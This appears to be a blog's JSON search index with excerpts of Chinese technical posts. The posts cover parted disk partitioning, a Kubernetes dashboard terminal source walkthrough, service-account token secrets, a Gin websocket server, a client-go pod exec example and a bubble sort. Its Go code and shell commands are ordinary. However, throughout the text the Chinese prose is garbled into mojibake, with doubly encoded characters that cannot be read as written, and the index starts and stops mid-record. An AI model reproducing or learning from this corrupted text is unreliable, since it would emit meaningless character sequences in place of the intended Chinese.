13:24","objectID":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/:0:0","tags":["parted"],"title":"Partedå·¥å…·ä½¿ç”¨","uri":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"1. æ“ä½œsdbç£ç›˜ parted /dev/sdb ","date":"2023-01-18 13:24","objectID":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/:1:0","tags":["parted"],"title":"Partedå·¥å…·ä½¿ç”¨","uri":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"2. ä¿®æ”¹ç£ç›˜çš„åˆ†åŒºè¡¨ä¸ºgpt (parted) mklabel gpt ç±»å‹æ˜¯ä»¥ä¸‹å…¶ä¸­ä¹‹ä¸€ â€œaixâ€, â€œamigaâ€,â€œbsdâ€, â€œdvhâ€, â€œgptâ€, â€œloopâ€, â€œmacâ€, â€œmsdosâ€, â€œpc98â€, â€œsunâ€. ","date":"2023-01-18 13:24","objectID":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/:2:0","tags":["parted"],"title":"Partedå·¥å…·ä½¿ç”¨","uri":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"3. åˆ›å»ºåˆ†åŒº # å®Œå…¨ä½¿ç”¨ç£ç›˜å¤§å° (parted) mkpart data 0% 100% # åˆ†é…æŒ‡å®šå¤§å°(ä»ç¬¬ä¸€ä¸ªæ‰‡åŒºå¼€å§‹åˆ°1024Mçš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯1ä¸ªG) # (parted) mkpart data 1 1024M å‘½ä»¤å‚æ•°: mkpart[part-type name fs-type] start end part-type å½“åˆ†åŒºè¡¨æ˜¯msdosã€dvhæ—¶æ‰éœ€è¦ä½¿ç”¨è¿™ä¸ªå‚æ•°,å¯é€‰é¡¹æ˜¯\"primary\", â€œlogicalâ€, â€œextendedâ€. name å½“åˆ†åŒºè¡¨æ˜¯GPTæ—¶ï¼Œå¯ä»¥æŒ‡å®šnameï¼Œéå¿…é¡»çš„ fs-type å¯é€‰é¡¹ï¼ŒæŒ‡å®šæ–‡ä»¶ç³»ç»Ÿç±»å‹ â€œbtrfsâ€, â€œext2â€, â€œext3â€, â€œext4â€, â€œfat16â€, â€œfat32â€, â€œhfsâ€, â€œhfs+â€, â€œlinux-swapâ€, â€œntfsâ€, â€œreiserfsâ€, â€œudfâ€, â€œxfsâ€. æš‚æ—¶æ²¡ç”¨åˆ° start å’Œ stop åˆ†åŒºèµ·å§‹ç»“æŸä½ç½®ã€‚ ä½¿ç”¨ç™¾åˆ†æ¯”æŒ‡å®šã€‚ä¾‹å¦‚ï¼Œ0% è¡¨ç¤ºåˆ†åŒºçš„èµ·å§‹ä½ç½®æ˜¯ç¡¬ç›˜çš„ç¬¬0ä¸ªæ‰‡åŒºï¼Œ50% è¡¨ç¤ºåˆ†åŒºçš„èµ·å§‹ä½ç½®æ˜¯ç¡¬ç›˜çš„ä¸€åŠã€‚ ä½¿ç”¨æ•°å­—æŒ‡å®šã€‚ä¾‹å¦‚ï¼Œ2048 è¡¨ç¤ºåˆ†åŒºçš„èµ·å§‹ä½ç½®æ˜¯ç¡¬ç›˜çš„ç¬¬2048ä¸ªæ‰‡åŒºï¼Œå»ºè®®ä»1å¼€å§‹æŒ‡å®šã€‚ ä½¿ç”¨å•ä½æŒ‡å®šã€‚ä¾‹å¦‚ï¼Œ100MB è¡¨ç¤ºåˆ†åŒºçš„èµ·å§‹ä½ç½®æ˜¯ç¡¬ç›˜çš„ç¬¬ 100MB ä½ç½®ã€‚ ","date":"2023-01-18 13:24","objectID":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/:3:0","tags":["parted"],"title":"Partedå·¥å…·ä½¿ç”¨","uri":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"4. æŸ¥çœ‹åˆ†åŒº (parted) p Model: VMware, VMware Virtual S (scsi) Disk /dev/sdb: 53.7GB Sector size (logical/physical): 512B/512B Partition Table: gpt Disk Flags: Number Start End Size File system Name Flags 1 1049kB 53.7GB 53.7GB data ","date":"2023-01-18 13:24","objectID":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/:4:0","tags":["parted"],"title":"Partedå·¥å…·ä½¿ç”¨","uri":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"5. é€€å‡º (parted) q ","date":"2023-01-18 13:24","objectID":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/:5:0","tags":["parted"],"title":"Partedå·¥å…·ä½¿ç”¨","uri":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"6. æ ¼å¼åŒ–åˆ†åŒº mkfs.xfs /dev/sdb1 ","date":"2023-01-18 13:24","objectID":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/:6:0","tags":["parted"],"title":"Partedå·¥å…·ä½¿ç”¨","uri":"/post/parted%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"categories":["å…¶ä»–"],"content":"å›¾æ ‡ç”Ÿæˆ https://realfavicongenerator.net/ é—®é¢˜æ£€æµ‹ https://www.pwabuilder.com/reportcard?site=https://soulchild.cn ","date":"2023-01-13 15:34","objectID":"/post/pwa%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/:0:0","tags":["hugo"],"title":"Pwaåœ¨çº¿å·¥å…·ç½‘ç«™","uri":"/post/pwa%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/"},{"categories":["kubernetes","äº‘åŸç”Ÿ","golang"],"content":"æºç ä½ç½® å‰ç«¯å®ç° https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/frontend/shell/template.html https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/frontend/shell/component.ts åç«¯å®ç° å…¥å£æœ‰ä¸¤ä¸ª sockjsè¿æ¥å®ç° https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/backend/dashboard.go è®¿é—®ç»ˆç«¯ç•Œé¢æ—¶çš„handler https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/backend/handler/apihandler.go ä¸»è¦é€»è¾‘ https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/backend/handler/terminal.go ","date":"2022-12-20 23:48","objectID":"/post/2950/:0:1","tags":["k8s","go"],"title":"k8s dashboard terminalæºç åˆ†æ","uri":"/post/2950/"},{"categories":["kubernetes","äº‘åŸç”Ÿ","golang"],"content":"æºç åˆ†æ ä¸€ã€socketéƒ¨åˆ† é¦–å…ˆé€šè¿‡å…¥å£å¼€å§‹å®šä½ï¼Œæ…¢æ…¢æŠŠæµç¨‹ä¸²èµ·æ¥. é€šè¿‡æµè§ˆå™¨å¯ä»¥å®šä½åˆ°web terminalä½¿ç”¨äº†websocketè¿›è¡Œçš„é€šä¿¡ï¼Œå¯¹è¯å†…å®¹ä¹Ÿå¯ä»¥è®°ä¸€ä¸‹ï¼Œè¿™ä¸ªé¡ºåºä¹Ÿæœ‰äº›ç”¨ã€‚ 21078-lkwsyb278wc.png åœ¨æºç ä¸­æ‰¾åˆ°apiè·¯ç”±/api/sockjs/491/jv0og3kn/websocket?29677d05b2b2932b300380c0cc0dcaf4 æºç ä½ç½® https://github.com/kubernetes/dashboard/blob/v2.7.0/src/app/backend/dashboard.go#L170 è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥/api/sockjs/å¼€å¤´çš„è·¯ç”±éƒ½äº¤ç»™äº†handler.CreateAttachHandler(\"/api/sockjs\")å‡½æ•°å¤„ç† è¿™ä¸ªå‡½æ•°å¾ˆç®€å•å°±ä¸€å¥return sockjs.NewHandler(path, sockjs.DefaultOptions, handleTerminalSession) /api/sockjsè¿™ä¸ªè·¯ç”±æœ€ç»ˆçš„å¤„ç†å‡½æ•°æ˜¯handleTerminalSessionï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶sockjs.Sessionç±»å‹å‚æ•°ï¼Œé€šè¿‡ä»–å¯ä»¥è¯»å–websocketä¼šè¯çš„æ¶ˆæ¯ã€‚ è¿™ä¸ªå‡½æ•°å‰é¢åšäº†ä¸€äº›åˆ¤æ–­errï¼Œmsgå˜é‡æ˜¯TerminalMessageç»“æ„ä½“å®ä¾‹åŒ–å‡ºæ¥çš„ï¼Œä¸»è¦åº”è¯¥ç”¨æ¥ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ æ¥çš„æ¶ˆæ¯ä¸ºç»“æ„ä½“å¯¹è±¡çš„ï¼Œåé¢ä¸¤ä¸ªï¼Œå¦‚æœå»ºç«‹ä¼šè¯åå‘é€çš„å†…å®¹ä¸­msg.Opä¸æ˜¯bindå°±ç›´æ¥returnï¼Œä¸‹é¢ä¼šåˆ¤æ–­msgä¸­çš„sessionIDæ˜¯å¦å­˜åœ¨äºterminalSessionsä¸­ï¼Œä¸å­˜åœ¨çš„sessionIDä¹Ÿä¼šreturn(ä»€ä¹ˆæ—¶å€™å°†sessionIDå­˜å…¥terminalSessionsä¸­çš„?åœ¨å¦ä¸€ä¸ªå…¥å£ä¸­ï¼Œåé¢ä¼šè¯´åˆ°ã€1ã€‘) 18297-49vtn04vmhj.png å†å¾€ä¸‹ï¼Œç¬¬ä¸€è¡Œæ˜¯å°†sockjs.Sessionå¯¹è±¡å­˜å…¥sockJSSessionä¸­ï¼Œç¬¬äºŒè¡Œæ˜¯å°†sockjs.Sessionå¯¹è±¡å­˜å…¥SessionMapä¸­, sockjs.Sessionå¯¹è±¡å¯ä»¥ç”¨æ¥å‘é€å’Œæ¥å—æ•°æ® ç¬¬ä¸‰è¡Œçš„boundæ˜¯ä¸ªerrç±»å‹çš„channelï¼Œå°†nilæ”¾è¿›å», æ‰§è¡Œå®Œåº”è¯¥ä¼šé˜»å¡ï¼Œç”±åé¢çš„WaitForTerminalå‡½æ•°æ¥æ¶ˆè´¹å¤„ç† 83390-yukzu4wykv8.png è¿™é‡Œä½¿ç”¨äº†TerminalSessionç»“æ„ä½“ï¼ŒterminalSessionå˜é‡æ˜¯åœ¨å½“å‰å‡½æ•°ä½“å†…å£°æ˜çš„ï¼Œæˆ‘æ²¡æˆªå‡ºæ¥ã€‚ // è¿™é‡Œæ˜¯å®ä¾‹åŒ–StreamOptionséœ€è¦ç”¨çš„ä¸€äº›å‚æ•°ï¼Œstreamé€šè¿‡readã€writeæ–¹æ³•å°†æœåŠ¡ç«¯çš„stdoutã€stdinã€stderrã€å†™å…¥åˆ°æŒ‡å®šçš„ä½ç½®ï¼Œå…·ä½“å†™åˆ°å“ªå¯ä»¥çœ‹ä¸‹é¢çš„å®ç°é€»è¾‘ type PtyHandler interface { io.Reader io.Writer remotecommand.TerminalSizeQueue // ç»ˆç«¯å¤§å°ï¼Œä¹Ÿæ˜¯streaméœ€è¦çš„option } // TerminalSession implements PtyHandler (using a SockJS connection) type TerminalSession struct { id string bound chan error sockJSSession sockjs.Session sizeChan chan remotecommand.TerminalSize // è¿™ä¸ªç»“æ„ä½“å°±ä¸¤ä¸ªå±æ€§å®½å’Œé«˜ } // å’Œå®¢æˆ·ç«¯å‘çš„æ¶ˆæ¯æ ¼å¼å¯¹åº”ï¼Œæ ¼å¼ä¸ä¸€è‡´å°±æ— æ³•ååºåˆ—åŒ–ï¼Œä»è€Œæ— æ³•å»ºç«‹è¿æ¥ type TerminalMessage struct { Op, Data, SessionID string Rows, Cols uint16 } // ä¸»è¦ç”¨æ¥å­˜å‚¨sessionIdå’Œsessionçš„å¯¹åº”å…³ç³»çš„ï¼Œé€šè¿‡getã€setæ–¹æ³•å¯ä»¥è¯»å–å’Œè®¾ç½® type SessionMap struct { Sessions map[string]TerminalSession Lock sync.RWMutex } æ³¨é‡Šä¸­è¯´TerminalSessionå®ç°äº†PtyHandleræ¥å£ï¼Œå¹¶ä¸”ä»–è¿˜æ‹¥æœ‰SockJS sessionå¯¹è±¡ä¿¡æ¯ï¼ŒPtyHandleræ¥å£ç»§æ‰¿äº†io.Readerã€io.Writerã€remotecommand.TerminalSizeQueueï¼Œåªè¦å®ç°ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•å³å¯ read è¯»å–å®¢æˆ·ç«¯å‘æ¥çš„æ•°æ® write å‘å®¢æˆ·ç«¯å‘é€æ•°æ® next è·å–ç»ˆç«¯å¤§å°ï¼Œè¿”å›ç»™è°ƒç”¨æ–¹ çœ‹çœ‹ä»–å®ç°è¿™äº›æ–¹æ³•çš„é€»è¾‘ // Readæ–¹æ³•å°†ç»ˆç«¯å¤§å°å­˜å…¥åˆ°channelä¸­äº†ï¼Œè¿™ä¸ªæ–¹æ³•ä»channelä¸­è¯»å‡ºæ¥å¹¶å°†ç»“æœè¿”å› func (t TerminalSession) Next() *remotecommand.TerminalSize { size := \u003c-t.sizeChan if size.Height == 0 \u0026\u0026 size.Width == 0 { return nil } return \u0026size } func (t TerminalSession) Read(p []byte) (int, error) { m, err := t.sockJSSession.Recv() // è¯»å–å®¢æˆ·ç«¯çš„æ•°æ® if err != nil { // Send terminated signal to process to avoid resource leak return copy(p, END_OF_TRANSMISSION), err // å¦‚æœè¯»å–å¼‚å¸¸åˆ™returnä¸€ä¸ªç»ˆæ­¢ä¼ è¾“çš„ç¬¦å·(\\u0004-EOT) } var msg TerminalMessage if err := json.Unmarshal([]byte(m), \u0026msg); err != nil { return copy(p, END_OF_TRANSMISSION), err } switch msg.Op { // æˆåŠŸè¯»å–æ•°æ®å,éœ€è¦æ ¹æ®æ•°æ®ä¸­çš„Opå±æ€§ï¼Œåˆ¤æ–­è¦è¿›è¡Œçš„åŠ¨ä½œ case \"stdin\": return copy(p, msg.Data), nil case \"resize\": // å®ä¾‹åŒ–TerminalSizeå¯¹è±¡ï¼Œå®¢æˆ·ç«¯å‘æ¥çš„ç»ˆç«¯å¤§å°æ”¾åœ¨è¿™ä¸ªå¯¹è±¡é‡Œ, å°†è¿™ä¸ªå¯¹è±¡æ”¾å…¥sizeChanä¸­ t.sizeChan \u003c- remotecommand.TerminalSize{Width: msg.Cols, Height: msg.Rows} return 0, nil default: return copy(p, END_OF_TRANSMISSION), fmt.Errorf(\"unknown message type '%s'\", msg.Op) // æœªçŸ¥çš„Opå±æ€§ï¼Œè¿”å›ç»ˆæ­¢ä¼ è¾“ç¬¦å·ï¼ŒåŒæ—¶è¿”å›é”™è¯¯ä¿¡æ¯ } } // å¯¹æ•°æ®åºåˆ—åŒ–è¿›è¡Œç„¶åå‘é€ç»™å®¢æˆ·ç«¯ï¼Œç±»å‹æ˜¯stdout func (t TerminalSession) Write(p []byte) (int, error) { msg, err := json.Marshal(TerminalMessage{ Op: \"stdout\", Data: string(p), }) if err != nil { return 0, err } if err = t.sockJSSession.Send(string(msg)); err != nil { return 0, err } return len(p), nil } // å‘é€ç±»å‹ä¸ºOOBçš„æ¶ˆæ¯ï¼Œæš‚æ—¶ä¸ç®¡ï¼Œå¯èƒ½é€‚ç”¨äºæ‰©å±•è­¦å‘Šä¿¡æ¯ç­‰ func (t TerminalSession) Toast(p string) error { msg, err := json.Marshal(TerminalMessage{ Op: \"toast\", Data: p, }) if err != nil { return err } if err = t.sockJSSession.Send(string(msg)); err != nil { return err } return nil } å°æ€»ç»“ å®¢æˆ·ç«¯å‘é€/api/sockjs/xxxxåä¼šæ‰§è¡ŒhandleTerminalSessionå‡½æ•°è¿›è¡Œåˆå§‹åŒ–ï¼ŒéªŒè¯è¿æ¥çš„åˆæ³•æ€§ï¼Œå¦‚æœåˆæ³•å°†websocketçš„sessionå­˜å…¥sessionMapä¸­ï¼Œæœ€åå‘boundè¿™ä¸ªchannelä¸­æ”¾å…¥nilï¼Œé€šçŸ¥å¦ä¸€ä¸ªå‡½æ•°å½“å‰è¿æ¥å·²å°±ç»ª äºŒã€apiserveräº¤äº’éƒ¨åˆ† å½“è¿›å…¥è¿™ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œå®ƒä¼šå‘é€ä¸€ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªid 54674-jgv8dqlhzi.png 53512-olpqyd97ujr.png åç«¯å¤„ç†é€»è¾‘åˆ†æï¼Œé¦–å…ˆå®šä½åˆ°å®ƒçš„handleræ˜¯handleExecShell 72415-nvk4u09b4cs.png æºç å¦‚ä¸‹ // Handles execute shell API call func (apiHandler *APIHandler) handleExecShell(request *restful.Request, response *restful.Response) { sessionID, err := genTerminalSessionId() // è¿™é‡Œè°ƒç”¨äº†genTerminalSessionIdå‡½æ•°ï¼Œéšæœºç”Ÿæˆä¸€ä¸ªID if err != nil { errors.HandleInternalErro","date":"2022-12-20 23:48","objectID":"/post/2950/:0:2","tags":["k8s","go"],"title":"k8s dashboard terminalæºç åˆ†æ","uri":"/post/2950/"},{"categories":["kubernetes","äº‘åŸç”Ÿ","golang"],"content":"åŠŸèƒ½æ‹†è§£ä¾‹å­ ä»£ç é‡æ˜æ˜¾å‡å°‘ï¼Œæ–¹ä¾¿é˜…è¯» https://github.com/SoulChildTc/k8s-web-terminal-learn ","date":"2022-12-20 23:48","objectID":"/post/2950/:0:3","tags":["k8s","go"],"title":"k8s dashboard terminalæºç åˆ†æ","uri":"/post/2950/"},{"categories":["kubernetes"],"content":"æœç„¶ä¸¤å¤©ä¸çœ‹å°±è·Ÿä¸ä¸Šäº†ï¼Œæˆ‘çš„é›†ç¾¤ç‰ˆæœ¬æ˜¯1.25.3ï¼Œä»Šå¤©éœ€è¦ç”¨tokenæ¥åšäº›äº‹æƒ…ï¼Œåˆ›å»ºserviceAccountçš„æ—¶å€™å‘ç°æ²¡æœ‰ç”Ÿæˆsecretï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°ä»1.24å¼€å§‹å°±ä¸ä¼šè‡ªåŠ¨ç”Ÿæˆsecretäº†ï¼Œchanagelogåœ¨è¿™é‡Œ. å†…å®¹å¦‚ä¸‹ LegacyServiceAccountTokenNoAutoGeneration åŠŸèƒ½é—¨æ˜¯æµ‹è¯•ç‰ˆï¼Œé»˜è®¤å¯ç”¨ã€‚å¯ç”¨åï¼Œä¸å†ä¸ºæ¯ä¸ª ServiceAccount è‡ªåŠ¨ç”ŸæˆåŒ…å«æœåŠ¡å¸æˆ·ä»¤ç‰Œçš„ Secret API å¯¹è±¡ã€‚ä½¿ç”¨ TokenRequest API è·å–æœåŠ¡å¸æˆ·ä»¤ç‰Œï¼Œæˆ–è€…å¦‚æœéœ€è¦æœªè¿‡æœŸçš„ä»¤ç‰Œï¼Œè¯·æŒ‰ç…§æœ¬æŒ‡å—ä¸ºä»¤ç‰Œæ§åˆ¶å™¨åˆ›å»ºä¸€ä¸ª Secret API å¯¹è±¡ä»¥å¡«å……æœåŠ¡å¸æˆ·ä»¤ç‰Œ pr: https://github.com/kubernetes/kubernetes/pull/108309 åœ¨ä¸Šé¢æåˆ°çš„ä¸¤ç§æ–¹å¼è¦æ€ä¹ˆç”¨å‘¢ æ–¹å¼1 ä½¿ç”¨TokenRequest APIæ¥ç”Ÿæˆtokenï¼Œè·å–æ–¹å¼å¦‚ä¸‹ ä½¿ç”¨client-goæˆ–è€…å…¶ä»–apiè°ƒç”¨å·¥å…·æ¥è·å–æŸä¸ªserviceaccountçš„token åˆ›å»ºyamlï¼Œä½¿ç”¨kubectl apply -f ä½¿ç”¨kubectl create token -n xxx \u003cserviceaccount-name\u003eæ¥è·å–ä¸€ä¸ªä¸´æ—¶çš„token,é»˜è®¤1å°æ—¶ æ–¹å¼2 åˆ›å»ºsecret tokenï¼Œåˆ›å»ºåä»secretçš„tokenå­—æ®µæ‹¿å°±å¯ä»¥äº† apiVersion: v1 kind: Secret metadata: name: secret-sa-sample annotations: kubernetes.io/service-account.name: \"sa-name\" # è¿™é‡Œå¡«å†™serviceAccountName type: kubernetes.io/service-account-token ","date":"2022-12-17 13:25","objectID":"/post/2945/:0:0","tags":["k8s"],"title":"k8s serviceaccountåˆ›å»ºåæ²¡æœ‰ç”Ÿæˆå¯¹åº”çš„secret","uri":"/post/2945/"},{"categories":["golang"],"content":"å‚è€ƒ: https://hoohoo.top/blog/20220320172715-go-websocket/ å…³äºå®¢æˆ·ç«¯éƒ¨åˆ†ä½¿ç”¨ chrome æ‰©å±•ï¼šWebsocket Kingã€‚ åœ¨çº¿ç‰ˆ: https://websocketking.com/ ","date":"2022-12-16 23:51","objectID":"/post/2942/:0:0","tags":["gin"],"title":"Gin+Gorillaæ„å»ºä¸€ä¸ªç®€å•çš„websocketæœåŠ¡ç«¯","uri":"/post/2942/"},{"categories":["golang"],"content":"å®‰è£…module go get github.com/gin-gonic/gin go get github.com/gorilla/websocket ","date":"2022-12-16 23:51","objectID":"/post/2942/:0:1","tags":["gin"],"title":"Gin+Gorillaæ„å»ºä¸€ä¸ªç®€å•çš„websocketæœåŠ¡ç«¯","uri":"/post/2942/"},{"categories":["golang"],"content":"æ„å»ºä¸€ä¸ª websocket æœåŠ¡å™¨ ä»¥ä¸‹æ˜¯ä½¿ç”¨ gin å’Œ gorilla æ„å»ºçš„ç®€å• websocket æœåŠ¡å™¨çš„ç¤ºä¾‹ï¼ŒGin åˆ›å»ºä¸€ä¸ª get è¯·æ±‚ï¼Œå¹¶é€šè¿‡ upgrade.Upgrade å°†è¿™ä¸ª HTTP è¿æ¥å‡çº§ä¸º websocket è¿æ¥ã€‚ å¯ä»¥ä½¿ç”¨å…·æœ‰ä»¥ä¸‹å‚æ•°çš„ websocket.Upgraderï¼š HandshakeTimeoutï¼šæŒ‡å®šæ¡æ‰‹å®Œæˆçš„è¶…æ—¶æ—¶é—´ã€‚ ReadBufferSize å’Œ WriteBufferSizeï¼šä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®š I/O ç¼“å†²åŒºå¤§å°ï¼Œè¿™ä¸ä¼šé™åˆ¶å‘é€æ¶ˆæ¯çš„å¤§å°ã€‚ WriteBufferPoolï¼šç”¨äºå†™æ“ä½œçš„ç¼“å†²åŒºæ± , ç¼“å†²åŒºå¯ä»¥ä½¿ç”¨åè¢«é‡ç”¨ï¼Œä»è€Œå‡å°‘å†…å­˜åˆ†é…å’Œå›æ”¶çš„å¼€é”€ã€‚ Subprotocolsï¼šæŒ‡å®šæœåŠ¡å™¨æ”¯æŒçš„å­åè®®åˆ—è¡¨ï¼ŒæŒ‰ç…§é¡ºåºæ¥åå•†ä½¿ç”¨å“ªä¸ªï¼Œæ¯”å¦‚chatï¼Œjsonrpcï¼Œsoapï¼Œxmppç­‰ç­‰ã€‚ Errorï¼šhttpå‡çº§åˆ°websocketå‘ç”Ÿé”™è¯¯æ—¶çš„å¤„ç†å‡½æ•°ï¼Œå¯ä»¥ä»¥httpçš„æ–¹å¼å“åº”å›å» CheckOrigin: å¯ä»¥è¿›è¡Œé‰´æƒä¹‹ç±»çš„æ“ä½œï¼Œä¸ç¬¦åˆæ¡ä»¶çš„ä¸å…è®¸å»ºç«‹websocketè¿æ¥ EnableCompressionï¼šæŒ‡å®šæœåŠ¡å™¨æ˜¯å¦åº”è¯¥å°è¯•åå•†æ¯ä¸ªæ¶ˆæ¯çš„å‹ç¼©(RFC 7692)ã€‚ package main import ( \"fmt\" \"github.com/gin-gonic/gin\" \"github.com/gorilla/websocket\" \"net/http\" \"time\" ) var upgrader = websocket.Upgrader{ HandshakeTimeout: time.Second * 3, ReadBufferSize: 4096, WriteBufferSize: 4096, Error: func(w http.ResponseWriter, r *http.Request, status int, reason error) { fmt.Printf(\"å‡çº§è¿æ¥å‘ç”Ÿé”™è¯¯: %v\", reason) http.Error(w, http.StatusText(status), status) _, err := w.Write([]byte(\"å‡çº§è¿æ¥å‘ç”Ÿé”™è¯¯\")) if err != nil { fmt.Printf(\"å†™å…¥responseå¤±è´¥: %v\", reason) } }, CheckOrigin: func(r *http.Request) bool { return r.Header[\"Origin\"][0] == \"chrome-extension://cbcbkhdmedgianpaifchdaddpnmgnknn\" }, EnableCompression: true, } func main() { r := gin.Default() r.GET(\"/\", func(c *gin.Context) { // å°†getè¯·æ±‚å‡çº§æˆwebsocketåè®® ws, err := upgrader.Upgrade(c.Writer, c.Request, nil) if err != nil { fmt.Println(err) return } defer ws.Close() for { // è¯»å–messageæ¶ˆæ¯ mt, message, err := ws.ReadMessage() if err != nil { fmt.Println(err) break } // å¦‚æœå®¢æˆ·ç«¯å‘æ¥ping,æˆ‘ä»¬å°±å›å¤pong if string(message) == \"ping\" { message = []byte(\"pong\") } // å“åº”æ¶ˆæ¯åˆ°å®¢æˆ·ç«¯ err = ws.WriteMessage(mt, message) if err != nil { fmt.Println(err) break } } }) r.Run() // listen and serve on 0.0.0.0:8080 } 52939-uby3y8n9nn8.png é€šè¿‡httpè®¿é—® 81660-uibkq6q5ft.png ","date":"2022-12-16 23:51","objectID":"/post/2942/:0:2","tags":["gin"],"title":"Gin+Gorillaæ„å»ºä¸€ä¸ªç®€å•çš„websocketæœåŠ¡ç«¯","uri":"/post/2942/"},{"categories":["kubernetes","golang"],"content":"kubectl execæºç å®ç°: https://github.com/kubernetes/kubernetes/blob/release-1.25/staging/src/k8s.io/kubectl/pkg/cmd/exec/exec.go package main import ( \"bytes\" \"errors\" \"fmt\" \"github.com/wonderivan/logger\" corev1 \"k8s.io/api/core/v1\" \"k8s.io/client-go/kubernetes\" \"k8s.io/client-go/kubernetes/scheme\" \"k8s.io/client-go/rest\" \"k8s.io/client-go/tools/clientcmd\" \"k8s.io/client-go/tools/remotecommand\" ) var K8s k8s type k8s struct { ClientSet *kubernetes.Clientset Config *rest.Config } func (k *k8s) Init() { var err error k.Config, err = clientcmd.BuildConfigFromFlags(\"\", \"./kube-config\") if err != nil { panic(\"kubeConfigè§£æå¤±è´¥: \" + err.Error()) } // NewForConfigè¿”å›ä¸€ä¸ªClientSetçš„æŒ‡é’ˆå¯¹è±¡ï¼Œä»–åŒ…å«äº†æ‰€æœ‰k8så†…ç½®çš„api k.ClientSet, err = kubernetes.NewForConfig(k.Config) if err != nil { panic(\"kubernetes clientåˆ›å»ºå¤±è´¥: \" + err.Error()) } else { logger.Info(\"kubernetes clientåˆå§‹åŒ–æˆåŠŸ\") } } func (k *k8s) ExecPod(podName, containerName, namespace string, cmd []string) (stdout bytes.Buffer, stderr bytes.Buffer, err error) { execOpt := \u0026corev1.PodExecOptions{ Stdin: false, Stdout: true, Stderr: true, TTY: false, Container: containerName, Command: cmd, } req := K8s.ClientSet.CoreV1().RESTClient().Post(). Resource(\"pods\"). Name(podName). Namespace(namespace). SubResource(\"exec\"). // æ³¨æ„è¿™é‡Œä¸€å®šè¦import \"k8s.io/client-go/kubernetes/scheme\"ï¼Œè€Œä¸æ˜¯\"k8s.io/apimachinery/pkg/apis/meta/internalversion/scheme\" VersionedParams(execOpt, scheme.ParameterCodec) exec, err := remotecommand.NewSPDYExecutor(K8s.Config, \"POST\", req.URL()) if err != nil { fmt.Println(\"NewSPDYExecutor: \" + err.Error()) return stdout, stderr, errors.New(\"NewSPDYExecutor: \" + err.Error()) } err = exec.Stream(remotecommand.StreamOptions{ Stdin: nil, Stdout: \u0026stdout, Stderr: \u0026stderr, Tty: false, }) if err != nil { fmt.Println(\"exec.Stream:\" + err.Error()) return stdout, stderr, errors.New(\"exec.Stream:\" + err.Error()) } //fmt.Println(stdout.String(), stderr.String()) return } func main() { K8s.Init() stdout, stderr, err := K8s.ExecPod( \"busybox-deployment-546c77d55b-p9nhh\", \"busybox\", \"default\", []string{\"hostname\"}) if err != nil { return } fmt.Println(stdout.String(), stderr.String()) } go.mod module go_learn go 1.18 require ( github.com/forgoer/openssl v1.4.0 github.com/wonderivan/logger v1.0.0 k8s.io/api v0.25.3 k8s.io/client-go v0.25.3 ) ","date":"2022-12-16 23:20","objectID":"/post/2940/:0:0","tags":["go","client-go"],"title":"client-goè°ƒç”¨execå‘å®¹å™¨å‘é€æŒ‡ä»¤","uri":"/post/2940/"},{"categories":["golang"],"content":" package main import ( \"fmt\" ) func main() { /* åˆ‡ç‰‡ï¼šs = {30,50,20,10,60,40} ä»å°åˆ°è¾¾æ’åº å†’æ³¡æ’åº: i\u003ejï¼Œå¦‚æœæˆç«‹å°±äº¤æ¢,å¦åˆ™ä¸å˜ ç¬¬ä¸€è½® {30,50,20,10,60,40} ç¬¬1æ¬¡. 30\u003e50, ä¸å˜ {30,50,20,10,60,40} ç¬¬2æ¬¡. 50\u003e20, äº¤æ¢ {30,20,50,10,60,40} ç¬¬3æ¬¡. 50\u003e10, äº¤æ¢ {30,20,10,50,60,40} ç¬¬4æ¬¡. 50\u003e60, ä¸å˜ {30,20,10,50,60,40} ç¬¬5æ¬¡. 60\u003e40, äº¤æ¢ {30,20,10,50,40,60} ç¬¬äºŒè½® {30,20,10,50,40,60} ç¬¬1æ¬¡. 30\u003e20, äº¤æ¢ {20,30,10,50,40,60} ç¬¬2æ¬¡. 30\u003e10, äº¤æ¢ {20,10,30,50,40,60} ç¬¬3æ¬¡. 30\u003e50, ä¸å˜ {20,10,30,50,40,60} ç¬¬4æ¬¡. 50\u003e40, äº¤æ¢ {20,10,30,40,50,60} 